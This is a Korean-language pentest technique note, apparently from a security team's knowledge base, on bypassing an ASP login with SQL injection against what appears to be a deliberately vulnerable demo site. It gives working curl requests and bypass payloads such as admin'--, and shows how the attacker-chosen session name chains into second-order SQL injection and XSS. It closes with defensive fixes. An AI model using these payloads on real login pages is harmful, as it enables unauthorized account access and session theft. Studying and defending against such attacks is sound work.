# Authentication Bypass (로그인 SQLi + 세션명 신뢰)

> 이 파일은 동일 대상의 기존 초안(`동일 대상의 기존 초안/`)에 **없던 기법**이다 →
> 승격 시 `tech-docs/web/general/authentication-bypass.md` 로 새로 만들거나, 기존
> `sql-injection.md` 의 케이스로 병합할지 Claude Code가 판단.

## 1. 원리

로그인 쿼리가 **문자열 결합**으로 만들어지면, 아이디 입력이 SQL 문법의 일부가 되어
**비밀번호를 몰라도 조건을 참으로 만들 수 있다**. 그런데 여기서 한 단계 더 나아간 함정이 있다:

로그인 **판정 방식**이 "쿼리 결과가 비어있지 않은가"(`if not rs.EOF`)이면,
비밀번호 비교를 우회하는 것뿐 아니라 **입력한 아이디 문자열 자체가 세션에 저장**되는 구현이 흔하다
(`Session("user") = Request.Form("id")`). 이 경우 공격자는 **자기가 원하는 임의 문자열을 세션 식별자로
획득**한다 — 이 사실이 뒤에서 XSS·second-order 로 그대로 이어진다(§4).

## 2. 케이스 — 주석형 우회로 세션 획득

```bash
curl -s -o /dev/null -D - -c cookies.txt -X POST \
  --data-urlencode "tfUName=admin'--" --data-urlencode "tfUPass=x" \
  "http://<target>/Login.asp"
# → HTTP/1.1 302 + Location: Default.asp + Set-Cookie: <SESSION_COOKIE>...=...; path=/
```

- **판정은 상태코드로**: 302(+세션 쿠키) = 성공, 200(로그인 페이지 재렌더) = 실패.
- 같은 요청을 **존재하지 않는 계정**(`nosuchuser_zz`)으로 한 번 더 보내 200 을 확인하면
  "302 가 로그인 성공의 신호"라는 대조군이 완성된다.
- **재확인된 사례**: `testasp-vulnweb-jev-trial`(Round 2·4).

## 3. ★ 함정 — `' OR '1'='1` 계열이 **실패**할 수 있다 (AND 우선순위)

같은 지점에서 `x' OR '1'='1` 은 **200(실패)** 이었다. 이유는 쿼리 조립 결과다:

```
WHERE uname='<입력>' AND upass='<입력>'
→ 입력이 x' OR '1'='1 이면:
WHERE uname='x' OR '1'='1' AND upass='x'
        └ A ┘        └──── B ────┘
AND 가 OR 보다 우선 → A OR (B AND C) → 통과하려면 upass='x' 인 행이 필요 → 0행
```

→ **교훈**: "SQLi 가 되는 로그인"에서도 **페이로드에 따라 성공/실패가 갈린다**.
우회 페이로드 후보를 하나만 시도하고 "안 된다"고 결론내지 말고,
`'--`(주석) / `' OR 1=1--` / `' OR '1'='1' AND '1'='1` 처럼 **문법을 온전히 닫는 형태**를 함께 시도한다.

## 4. ★ 이 케이스의 확장 — 세션명이 **입력 원문**일 때

세션에 저장된 값을 확인하는 방법(로그인 후 아무 페이지에서 세션명이 출력되는 위치를 본다):

```bash
curl -s -b cookies.txt "http://<target>/Default.asp" | grep -o "logout [^<]*"
# 로그인에 쓴 문자열 그대로(따옴표 포함) 출력되면 → 세션명 = 입력 원문
```

이것이 확인되면 같은 로그인 하나로 **두 개의 서로 다른 임팩트**가 열린다
(각각 별도 기법 문서 참조):

1. 세션명에 `'` 포함 → 게시/등록 시 SQL 문자열이 깨져 **second-order**(`second-order-injection.md`)
2. 세션명에 HTML 포함 → 모든 페이지에서 **쓰기 없는 반사 XSS**(`stored-xss.md` §신규 케이스)

## 5. 검증 순서 (권장)

1. 우회 성공 확인(302 + 쿠키) + 실패 대조군(200)
2. 세션으로 **인증 전용 기능**에 접근되는지 확인 — 응답 크기/폼 존재 비교(익명 vs 인증)
3. 세션명 출력 위치를 찾아 문자열이 원문인지 확인(§4)
4. 세션 쿠키 플래그 확인: `Set-Cookie` 에 `HttpOnly`/`Secure`/`SameSite` 가 없으면
   XSS 와 결합 시 세션 탈취까지 성립(헤더 원문을 증거로 남긴다)

**재확인된 사례**: `testasp-vulnweb-jev-trial`(Round 2: 우회 5/5 페이로드 302 / Round 4: 세션명 의미·쿠키 플래그 확인)

## 6. 방어 관점

- 쿼리는 **파라미터 바인딩(준비된 문)** 으로만 조립한다.
- 로그인 판정은 "행 존재"가 아니라 **비밀번호 해시 비교**로 한다.
- 세션에는 **DB 에서 읽은 정규 식별자**(또는 임의 토큰)를 저장하고, 입력 원문을 저장하지 않는다.
- 쿠키에 `HttpOnly`/`Secure`/`SameSite=Lax|Strict` 를 설정해 XSS→세션 탈취 체인을 끊는다.
- 로그인 실패와 성공의 응답 차이(302/200)는 불가피하지만, 실패 사유를 구분해 알려주지 않는다.

<!-- 출처: journal/web/testasp-vulnweb-jev-trial/, Round 2 · Round 4 -->
